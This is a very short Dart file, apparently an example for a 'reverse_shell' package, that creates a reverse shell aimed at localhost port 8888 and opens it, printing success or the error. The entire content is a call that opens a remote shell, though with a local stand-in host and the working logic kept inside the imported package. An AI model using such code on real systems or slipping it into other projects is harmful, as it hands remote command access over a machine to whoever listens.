import 'package:reverse_shell/reverse_shell.dart';

void main() {
  var shell = ReverseShell(host: '127.0.0.1', port: 8888);

  try {
    shell.open();
    print('Shell is opened');
  } catch (e) {
    print(e);
  }
}
